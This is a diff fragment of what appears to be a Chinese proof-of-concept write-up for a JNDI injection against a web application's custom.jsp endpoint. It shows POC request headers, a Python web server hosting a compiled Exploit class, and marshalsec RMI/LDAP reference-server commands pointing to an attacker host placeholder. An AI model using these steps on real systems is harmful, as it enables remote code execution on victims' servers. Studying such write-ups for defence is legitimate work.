@@ -37,7 +37,7 @@ POC：
 
 ```
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
-Host: 127.0.0.1
+Host: 127.0.0.1
 User-Agent: Go-http-client/1.1
 Content-Length: 60
 Content-Type: application/x-www-form-urlencoded
@@ -149,7 +149,7 @@ javac Exploit.java  编译生成Exploit.class文件
 python 启动 web 服务
 
 ```
-python -m SimpleHTTPServer  1111
+python -m SimpleHTTPServer  1111
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVs2yfMaKSyVFPI9DcnafoSPTwPicXDLXbUAicQjial0fTTbBEENOw9k4FQ/640?wx_fmt=png)
@@ -163,7 +163,7 @@ python -m SimpleHTTPServer  1111
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfF5ibf0Z5YpAz9OYs2iaSVKVn2ukCgvMibicpX3Pnm6U9HaFYyVzpPWI3qROb6ic5eRElxf56Qlev34zQ/640?wx_fmt=png)
 
 ```
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer  http://XX.XX.XX.XX:1111/\#Exploit 9999
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer  http://XX.XX.XX.XX:1111/\#Exploit 9999
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer  http://XX.XX.XX.XX:1111/\#Exploit 9999
 ```
 
@@ -192,7 +192,7 @@ Cache-Control: max-age=0
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
 Sec-Ch-Ua-Mobile: ?0
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
 Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 
